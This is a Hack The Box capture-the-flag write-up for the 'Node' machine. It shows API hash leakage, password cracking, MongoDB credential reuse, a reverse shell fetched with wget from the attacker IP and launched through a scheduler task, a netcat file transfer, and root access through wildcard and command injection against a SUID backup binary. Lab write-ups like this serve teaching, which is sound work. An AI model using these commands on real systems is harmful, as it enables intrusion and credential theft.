@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.5.45">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2021-03-11">
+<meta name="description" content="Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.">
+
+<title>Node - Hack The Box</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Node - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">March 11, 2021</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
+        
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<p><img src="images/node_logo.png" class="img-fluid"></p>
+<p>“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”</p>
+<hr>
+<p>██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝</p>
+<ol type="1">
+<li><p>[p3:/git/htb/node]$ nmap -Pn -n -sCV 10.10.10.58 –open (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA) | 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA) |_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519) 3000/tcp open hadoop-tasktracker Apache Hadoop | hadoop-datanode-info: |_ Logs: /login | hadoop-tasktracker-info: |_ Logs: /login |_http-title: MyPlace Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p></li>
+<li><p>We find a login portal, not susceptible to SQLi. Looking through the debugger we find a lot of .js files; admin.js, home.js, login.js, profile.js, app.js</p></li>
+</ol>
+<p>In app.js we find a few interesting paths; var controllers = angular.module(‘controllers’, []); var app = angular.module(‘myplace’, [ ‘ngRoute’, ‘controllers’ ]);</p>
+<p>app.config(function ($routeProvider, $locationProvider) { $routeProvider. when(‘/’, { templateUrl: ‘/partials/home.html’, controller: ‘HomeCtrl’ }). when(‘/profiles/:username’, { templateUrl: ‘/partials/profile.html’, controller: ‘ProfileCtrl’ }). when(‘/login’, { templateUrl: ‘/partials/login.html’, controller: ‘LoginCtrl’ }). when(‘/admin’, { templateUrl: ‘/partials/admin.html’, controller: ‘AdminCtrl’ }). otherwise({ redirectTo: ‘/’ });</p>
+<pre><code>  $locationProvider.html5Mode(true);</code></pre>
+<p>});</p>
+<p>If we look further on /partials/admin.html we see that admins have the option to Download Backup.</p>
+git/htb/node]$ curl http://10.10.10.58:3000/partials/admin.html (master✱) — snip —
+<p>
+Only admin users have access to the control panel currently, but check back soon to test the standard user functionality!
+</p>
+<pre><code>&lt;/div&gt;
+&lt;div ng-if="user.is_admin"&gt;
+  &lt;button class="btn btn-large btn-primary" ng-click="backup()"&gt;Download Backup&lt;/button&gt;</code></pre>
+<p>— snip —</p>
+<p>In profile.js we find the line ‘$http.get(’/api/users/’ + $routeParams.username)’, curl /api/users to see if we can extract anything.</p>
+<p>[p3:/git/htb/node]$ curl http://10.10.10.58:3000/api/users (master✱) [{“_id”:“59a7365b98aa325cc03ee51c”,“username”:“myP14ceAdm1nAcc0uNT”,“password”:“dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af”,“is_admin”:true}, {“_id”:“59a7368398aa325cc03ee51d”,“username”:“tom”,“password”:“f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240”,“is_admin”:false}, {“_id”:“59a7368e98aa325cc03ee51e”,“username”:“mark”,“password”:“de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73”,“is_admin”:false}, {“_id”:“59aa9781cced6f1d1490fce9”,“username”:“rastating”,“password”:“5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0”,“is_admin”:false}]</p>
+<ol start="3" type="1">
+<li>Crack the hashes with hashcat / crackstation.net</li>
+</ol>
+<p>[p3:/git/htb/node]$ hashcat -a0 -m1400 hashes.txt /usr/share/wordlists/rockyou.txt — snip — f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake</p>
+<p>We have three sets of creds; myP14ceAdm1nAcc0uNT:manchester (admin) tom:spongebob mark:snowflake</p>
+<p>Login with the admin account, and download the backup file.</p>
+<p>[p3:/git/htb/node]$ strings myplace.backup| base64 –decode &gt; out [p3:/git/htb/node]$ file -b out (master✱) Zip archive data, at least v1.0 to extract [p3:/git/htb/node]$ sudo mv out out.zip</p>
+<p>The zip file is password protected, trying the previous known passwords don’t work. To crack the zip file we use fcrackzip.</p>
+<p>[p3:/git/htb/node]$ fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt out.zip (master✱) ‘var/www/myplace/’ is not encrypted, skipping found file ‘var/www/myplace/package-lock.json’, (size cp/uc 4404/ 21264, flags 9, chk 0145) ‘var/www/myplace/node_modules/’ is not encrypted, skipping ‘var/www/myplace/node_modules/serve-static/’ is not encrypted, skipping found file ‘var/www/myplace/node_modules/serve-static/README.md’, (size cp/uc 2733/ 7508, flags 9, chk 1223) found file ‘var/www/myplace/node_modules/serve-static/index.js’, (size cp/uc 1640/ 4533, flags 9, chk b964) found file ‘var/www/myplace/node_modules/serve-static/LICENSE’, (size cp/uc 697/ 1189, flags 9, chk 1020) found file ‘var/www/myplace/node_modules/serve-static/HISTORY.md’, (size cp/uc 2625/ 8504, flags 9, chk 35bd) found file ‘var/www/myplace/node_modules/serve-static/package.json’, (size cp/uc 868/ 2175, flags 9, chk 0145) ‘var/www/myplace/node_modules/utils-merge/’ is not encrypted, skipping found file ‘var/www/myplace/node_modules/utils-merge/README.md’, (size cp/uc 344/ 634, flags 9, chk 9f17) found file ‘var/www/myplace/node_modules/utils-merge/index.js’, (size cp/uc 219/ 381, flags 9, chk 9e03) 8 file maximum reached, skipping further files</p>
+<p>PASSWORD FOUND!!!!: pw == magicword</p>
+<ol start="4" type="1">
+<li>Unzip the backup file, with password ‘magicword’.</li>
+</ol>
+<p>[p3:/git/htb/node]$ sudo unzip -P magicword out.zip -d backup (master✱) Archive: out.zip</p>
+<p>[p3:…node/backup/var/www/myplace]$ cat app.js — snip — const url = ‘mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace’;</p>
+<p>We find a new sets of (SSH) creds! mark:5AYRft73VtFpc84k</p>
+<ol start="5" type="1">
+<li>Once logged in as mark we don’t get user.txt. Looking in /home we find three users;</li>
+</ol>
+<ul>
+<li>frank</li>
+<li>mark</li>
+<li>tom (got user.txt)</li>
+</ul>
+<p>We see that port 27017 is running locally. Further investigating it shows it’s mongodb.</p>
+<p>[+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN -</p>
+<p>We can extract the contents with ‘mongodump’ however we only find the users and hashes that we already had. mark@node:/dev/shm$ mongodump -d myplace -u mark -p 5AYRft73VtFpc84k 2021-03-10T20:31:02.004+0000 writing myplace.users to 2021-03-10T20:31:02.006+0000 done dumping myplace.users (4 documents)</p>
+<p>After being stuck here for a good while, i noticed that user Tom runs two services; mark@node:/dev/shm/dump/scheduler$ ps aux | grep tom tom 1230 0.0 5.2 1008568 39940 ? Ssl 17:07 0:03 /usr/bin/node /var/scheduler/app.js tom 1236 0.0 6.4 1028912 48780 ? Ssl 17:07 0:07 /usr/bin/node /var/www/myplace/app.js</p>
+<p>/var/www/myplace/app.js we already know about, it was here we got our creds, but /var/scheduler/app.js is new.</p>
+<p>mark@node:/dev/shm/dump/scheduler$ cat /var/scheduler/app.js — snip — const url = ‘mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler’;</p>
+<p>We find a new database, scheduler.</p>
+<ol start="6" type="1">
+<li>Exploit the mongo service.</li>
+</ol>
+<p>With the ‘insert’-commands (insert, insertOne, insertMany) we can insert a file to be processed by the database. The means that we can upload a reverse shell, and execute it as user tom (as he is running the mongo service).</p>
+<p>mark@node:/dev/shm$ wget http://10.10.14.11:8888/rev.js</p>
+<p>mark@node:/dev/shm$ mongo scheduler -u mark -p 5AYRft73VtFpc84k MongoDB shell version: 3.2.16 connecting to: scheduler &gt; show collections tasks &gt; db.tasks.insertOne({cmd:“/usr/bin/node /dev/shm/rev.js”}); { “acknowledged” : true, “insertedId” : ObjectId(“604b3e15d2e31be023d70272”) }</p>
+<p>[p3:/git/htb/solidstate]$ nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.11] from (UNKNOWN) [10.10.10.58] 44652 id uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin) cat ~/user.txt e1156acc3574e04b06908ecf76be91b1</p>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝</p>
+<ol type="1">
+<li>As we saw from our ‘id’-command, we are a part of the groups ‘adm’ and ‘sudo’ - so as usual we run ‘sudo -l’.</li>
+</ol>
+<p>tom@node:/dev/shm$ sudo -l [sudo] password for tom:</p>
+<p>We don’t know tom’s password, so this is a dead end. Upload and run linpeas.sh to find another attack vector.</p>
+<p>====================================( Interesting Files )===================================== [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid — snip — -rwsr-xr– 1 root admin 17K Sep 3 2017 /usr/local/bin/backup — It looks like /usr/local/bin/backup is executing /etc and you can impersonate it (strings line: /etc) (https://tinyurl.com/suidpath) — It looks like /usr/local/bin/backup is executing /root and you can impersonate it (strings line: /root) (https://tinyurl.com/suidpath) — It looks like /usr/local/bin/backup is executing time and you can impersonate it (strings line: time) (https://tinyurl.com/suidpath) — Trying to execute /usr/local/bin/backup with strace in order to look for hijackable libraries…</p>
+<p>/usr/local/bin/backup is owned by root, and group admin. If we run the binary, nothing happens (that we can see). Running strings on the file gives us a clue on what’s going on.</p>
+<p>tom@node:~$ strings /usr/local/bin/backup — snip — ____________________________________________________ /<br>
+| _____________________________________________ | | | | | | | Secure Backup v1.0 | | | |_____________________________________________| | | | _____________________________________________________/ _______________________________________/ _______________________________________________ <em>-’ .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. — <code>-_             _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.</code>-</em> <em>-‘.-.-.-. .—.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-<code>__</code>. .-.-.-.<code>-_        _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.</code>-<em> </em>-’.-.-.-.-.-. .—.-. .—————————–. .-.—. .—.-.-.-.<code>-_     :-----------------------------------------------------------------------------:</code>—.</em>.—————————————————————–._.—’ Could not open file Validated access token Ah-ah-ah! You didn’t say the magic word! Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== /root /etc /tmp/.backup_%i /usr/bin/zip -r -P magicword %s %s &gt; /dev/null /usr/bin/base64 -w0 %s The target path doesn’t exist ;*2$” GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609</p>
+<p>The base64 code is just a trollface. We can’t really investigate the binary further, so transfer the file to your local machine.</p>
+<p>[p3:/git/htb/node]$ sudo nc -lp 4400 &gt; backup tom@node:/usr/local/bin$ nc -w 3 10.10.14.11 4400 &lt; backup</p>
+<ol start="2" type="1">
+<li><p>If I’m reading the code correct, the binary zips /root and /etc, password protects the zip and then throws it to /dev/null. Maybe we can Buffer overflow to grab the files before thrown away?</p>
+<p>Tring when trying to execute the file we get no output at all. To understand how to use it, we must look back at /var/www/myplace/app.js;</p></li>
+</ol>
+<p>tom@node:/$ cat /var/www/myplace/app.js | grep backup const backup_key = ‘45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474’; — snip — var proc = spawn(‘/usr/local/bin/backup’, [‘-q’, backup_key, __dirname ]); — snip —</p>
+<p>From the code we find a key, and how to execute the binary. Lets try to backup /root/root.txt.</p>
+<p>tom@node:/dev/shm$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root/root.txt [+] Finished! Encoded backup is below:</p>
+<p>UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==</p>
+<p>We can see directly that the base64 is the same that we got from our strings, a trollface.</p>
+<ol start="3" type="1">
+<li>Instead of using the directory name, we can use wildcard symbols to circumvent the trollface. tom@node:/dev/shm$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r<strong>t/r</strong>t.txt UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWWiTS2B1eAsAAQQAAAAABAAAAABBCIGHDmC+vo6OEZe88xXpB8P2VOruMCMNUzPVliowYtBD5ucJ7jLiDVnjEqJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA</li>
+</ol>
+<p>Decode the base64 and write it to a file, unzip with password ‘magicword’ and grab flag. [root:/git/htb/node]# unzip -P magicword root.zip (master✱) Archive: root.zip extracting: root/root.txt</p>
+<p>[root:/git/htb/node]# cat root/root.txt (master✱) 1722e99ca5f353b362556a62bd5e6be0</p>
+<p>BONUS: 1) Code injection tom@node:/usr/local/bin$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $‘/bin/sh echo OK’</p>
+<pre><code>zip error: Nothing to do! (/tmp/.backup_287397083)</code></pre>
+<p># whoami root # cat /root/root.txt 1722e99ca5f353b362556a62bd5e6be0</p>
+<ol start="2" type="1">
+<li>Bypassing ‘/root’ blacklist by standing in / and just writing ‘root’ tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root |base64 -d &gt; tmp/root.zip tom@node:/$ cd tmp tom@node:/$ unzip -P magicword root.zip Archive: root.zip creating: root/ inflating: root/.profile inflating: root/.bash_history creating: root/.cache/ extracting: root/.cache/motd.legal-displayed extracting: root/root.txt inflating: root/.bashrc inflating: root/.viminfo creating: root/.nano/ extracting: root/.nano/search_history tom@node:/$ cat tmp/root/root.txt 1722e99ca5f353b362556a62bd5e6be0</li>
+</ol>
+<p>BONUS BUFFER OVERFLOW:</p>
+<ol type="1">
+<li>Trying to execute ./backup locally gives us the error ’ [!] Could not open file’. If we investigate this with ltrace we can see that it tries to open /etc/myplace/keys.</li>
+</ol>
+<p>[root:/git/htb/node]# ltrace ./backup 1 2 3 — snip — fopen(“/etc/myplace/keys”, “r”) = 0 strcpy(0xffe4c358, “Could not open file”) = 0xffe4c358</p>
+<p>View the file on the victim, and copy it over to our local box. tom@node:/$ cat /etc/myplace/keys a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 [root:/git/htb/node]# mkdir /etc/myplace (master✱) [root:/git/htb/node]# vim /etc/myplace/keys</p>
+<p>Now if we try the binary (without the quite operator -q), we get something to work with. [root:/git/htb/node]# ./backup 1 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 testasdf — snip — [+] Validated access token [+] Starting archiving testis [!] The target path doesn’t exist</p>
+<ol start="2" type="1">
+<li>Check the security of the file.</li>
+</ol>
+<p>[root:/git/htb/node]# gdb ./backup</p>
+<p>gef➤ checksec [+] checksec for ‘/git/htb/node/backup’ Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial</p>
